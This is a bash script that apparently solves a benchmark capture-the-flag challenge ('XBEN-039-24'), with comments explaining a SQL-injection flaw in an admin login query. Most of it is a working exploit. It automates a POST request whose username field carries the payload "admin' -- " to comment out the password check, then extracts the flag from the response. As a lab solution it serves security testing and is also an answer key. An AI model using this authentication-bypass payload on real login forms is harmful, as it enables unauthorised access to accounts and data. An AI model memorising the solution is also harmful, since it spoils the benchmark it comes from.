#!/usr/bin/env bash
# XBEN-039-24 — "Easy login" (tags: sqli, privilege_escalation)
#
# The admin login builds its query by concatenation:
#
#     SELECT id FROM admins WHERE username = '$username' AND password = '$password'
#
# and prints the flag when exactly one row comes back. Commenting out the
# password test leaves one row, because there is one admin.
#
# The password is still hashed and still compared; it is simply no longer part
# of the query. That is the useful shape of this bug: nothing about the password
# has to be guessed or broken.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben039-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/admin.php" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' \
    --set "form.username=admin' -- " \
    --set 'form.password=anything' \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
